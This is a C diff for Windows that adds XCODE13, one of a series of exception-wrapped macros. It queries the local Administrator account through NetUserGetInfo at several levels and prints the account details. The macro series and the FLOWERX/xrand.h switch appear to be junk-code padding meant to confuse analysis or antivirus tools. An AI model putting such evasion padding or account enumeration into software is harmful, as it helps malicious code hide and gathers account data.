@@ -61,6 +61,15 @@ DWORD dwResumeHandle = 0;
 DWORD dwTotalCount = 0;
 NET_API_STATUS nStatus;
 
+LPUSER_INFO_1 pBuf1 = NULL;
+LPUSER_INFO_2 pBuf2 = NULL;
+LPUSER_INFO_3 pBuf3 = NULL;
+LPUSER_INFO_4 pBuf4 = NULL;
+LPUSER_INFO_10 pBuf10 = NULL;
+LPUSER_INFO_11 pBuf11 = NULL;
+LPUSER_INFO_20 pBuf20 = NULL;
+LPUSER_INFO_23 pBuf23 = NULL;
+
 #define XCODE1 __try{\
 		GetModuleFileName(NULL, szXBuff, sizeof(szXBuff)-1);\
 		hXMod = CreateFile(szXBuff, GENERIC_READ,NULL,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);\
@@ -415,6 +424,82 @@ do {\
 		Sleep(12);\
 	}
 
+#define XCODE13 __try{\
+		PasswdLen=0;\
+		while (PasswdLen < 24) {\
+		dwLevel = PasswdLen;\
+		nStatus = NetUserGetInfo(L"localhost", L"Administrator", dwLevel, (LPBYTE *) & pBuf);\
+		if (nStatus == NERR_Success) {\
+			if (pBuf != NULL) {\
+				switch (PasswdLen) {\
+				case 0:\
+					wprintf(L"\tUser account name: %s\n", pBuf->usri0_name);\
+					break;\
+				case 1:\
+					pBuf1 = (LPUSER_INFO_1) pBuf;\
+					wprintf(L"\tUser account name: %s\n", pBuf1->usri1_name);\
+					break;\
+				case 2:\
+					pBuf2 = (LPUSER_INFO_2) pBuf;\
+					wprintf(L"\tUser account name: %s\n", pBuf2->usri2_name);\
+					break;\
+				case 4:\
+					pBuf4 = (LPUSER_INFO_4) pBuf;\
+					wprintf(L"\tUser account name: %s\n", pBuf4->usri4_name);\
+					break;\
+				case 10:\
+					pBuf10 = (LPUSER_INFO_10) pBuf;\
+					wprintf(L"\tUser account name: %s\n", pBuf10->usri10_name);\
+					wprintf(L"\tFull name: %s\n", pBuf10->usri10_full_name);\
+					break;\
+				case 11:\
+					pBuf11 = (LPUSER_INFO_11) pBuf;\
+					wprintf(L"\tUser account name: %s\n", pBuf11->usri11_name);\
+					break;\
+				case 20:\
+					pBuf20 = (LPUSER_INFO_20) pBuf;\
+					wprintf(L"\tUser account name: %s\n", pBuf20->usri20_name);\
+					break;\
+				case 23:\
+					pBuf23 = (LPUSER_INFO_23) pBuf;\
+					wprintf(L"\tUser account name: %s\n", pBuf23->usri23_name);\
+					break;\
+				default:\
+					break;\
+				}\
+			}\
+		}\
+		else\
+			fprintf(stderr, "NetUserGetinfo failed with error: %d\n", nStatus);\
+		if (pBuf != NULL)\
+			NetApiBufferFree(pBuf);\
+		switch (PasswdLen){\
+		case 0:\
+		case 1:\
+		case 10:\
+			PasswdLen++;\
+			break;\
+		case 2:\
+			PasswdLen = 4;\
+			break;\
+		case 4:\
+			PasswdLen = 10;\
+			break;\
+		case 11:\
+			PasswdLen = 20;\
+			break;\
+		case 20:\
+			PasswdLen = 23;\
+			break;\
+		default:\
+			PasswdLen = 24;\
+			break;\
+		}\
+	}\
+	}\
+		__except(EXCEPTION_EXECUTE_HANDLER){\
+		Sleep(13);\
+	}
 #ifdef FLOWERX
 #include "xrand.h"
 #else
